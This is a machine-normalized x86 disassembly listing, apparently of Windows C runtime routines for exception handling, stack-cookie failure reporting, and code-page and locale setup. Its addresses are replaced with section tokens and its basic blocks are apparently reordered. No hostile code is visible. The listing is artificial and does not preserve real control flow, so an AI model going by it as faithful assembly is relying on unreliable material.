retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_42597b
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_4259c7
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_425a00
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_425a54
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42807a
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_425a8a
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_4234de
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_42807a
add esp 0x20
pop esi
pop ebp
retn
sub_425abd
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_425b94
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_42a735
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_425b94
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_4234de
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_42807a
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_425abd
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_425a00
pop ebx
leave
retn
sub_425c33
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_42ef19
call sub_42ef19
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_425ca8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_42a735
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_42a735
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_425cd4
mov edi edi
push ebp
mov ebp esp
call sub_42a735
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_425cfb
mov edi edi
push ebp
mov ebp esp
push esi
call sub_42a735
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_42a735
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_42a735
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_42ef19
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_425d4d
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_425a8a
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_430880
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_425dad
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_425de0
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_425e16
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_425e6f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_425ed7
mov edi edi
push ebp
mov ebp esp
push esi
call sub_425ec4
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_425e6f
pop ecx
mov esi eax
call sub_425eb1
mov [ eax ] esi
pop esi
pop ebp
retn
sub_425efa
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
lea edi [ esi + 0xc0 ]
mov eax [ edi ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ edi ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_428905
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_42894a
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_42894a
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_42894a
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_42894a
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_42c723
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_424869
push [ ebp - 0x1c ]
call sub_424869
push [ ebp - 0x20 ]
call sub_424869
push [ ebp - 0x28 ]
call sub_424869
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_424869
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0x1
mov [ ebp - 0x30 ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_430a86
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_428525
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_428525
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_4285a0
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_4285a0
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_4285a0
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
inc eax
inc eax
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_424869
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_424869
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_424869
push [ esi + 0xc0 ]
call sub_424869
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
cmp ecx edx
mov [ ebp - 0x20 ] ecx
jg r-xdata
mov ecx [ ebp - 0x1c ]
inc ecx
inc ecx
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
inc ecx
inc ecx
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_4262e8
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_430b1d
test eax eax
je r-xdata
push 0xa
call sub_42c53f
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_430b2a
pop ecx
push 0x3
call sub_42b1b3
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_42b5a0
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_4263ff
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_426420
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_424869
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_424869
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_424869
push [ esi + 0xc0 ]
call sub_424869
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_4310f5
push [ edi ]
call sub_424869
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_424869
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_424869
pop ecx
push [ esi + 0xb0 ]
call sub_424869
push [ esi + 0xbc ]
call sub_424869
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_424869
push [ esi + 0xbc ]
call sub_431512
pop ecx
pop ecx
push eax
call sub_424869
pop ecx
push eax
call sub_424869
push [ esi + 0xbc ]
call sub_431303
pop ecx
pop ecx
sub_426569
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_4265f8
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_426691
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_426569
pop ecx
pop edi
sub_4266b7
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_426569
pop ecx
test esi esi
je r-xdata
push esi
call sub_4265f8
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_426420
pop ecx
sub_4266f5
push 0xc
push r--data
call sub_42b398
call sub_42a735
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_42e2b8
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_4266b7
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42675f
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_42a735
mov esi [ eax + 0x6c ]
mov eax esi
call sub_42b3dd
retn
push 0x20
call sub_42af2d
pop ecx
sub_42676b
mov eax [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xa8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xd4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
retn
sub_4267be
push 0x8
push r--data
call sub_42b398
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_42b3dd
retn
push 0xd
call sub_42e2b8
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42686b
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_424869
pop ecx
push 0xc
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_4265f8
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_426877
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_424869
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_426420
pop ecx
sub_426883
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
dec edi
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_431866
add esp 0xc
test eax eax
je r-xdata
pop esi
sub_4268c3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_42b5a0
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_424930
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_4318da
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
mov [ edi + 0x8f ] bl
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_4318da
add esp 0x10
test eax eax
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
cmp bl 0x2c
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_423c0e
add esp 0x14
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_424930
test eax eax
sub_4269ec
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42aae1
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_426883
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_426883
add esp 0x14
sub_426a59
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0x10 ] ebx
call sub_428905
pop ecx
